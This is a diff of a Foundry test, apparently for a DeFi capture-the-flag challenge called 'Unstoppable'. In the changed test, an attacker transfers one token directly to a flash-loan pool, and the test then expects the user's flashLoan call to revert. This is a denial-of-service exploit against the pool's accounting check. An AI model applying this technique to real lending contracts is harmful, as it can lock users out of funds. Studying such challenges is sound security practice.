@@ -30,18 +30,13 @@ contract UnstoppableTest is Test {
         token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);
         assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
         assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);
-
-        vm.startPrank(someUser);
-        receiverContract = new ReceiverUnstoppable(address(pool));
-        receiverContract.executeFlashLoan(10);
-        vm.stopPrank();
     }
     
     function testComplete() external {
         vm.prank(attacker);
         token.transfer(address(pool), 1);
-        vm.expectRevert(stdError.assertionError);
         vm.prank(someUser);
-        receiverContract.executeFlashLoan(10);
+        vm.expectRevert(stdError.assertionError);
+        pool.flashLoan(10);
     }
 }
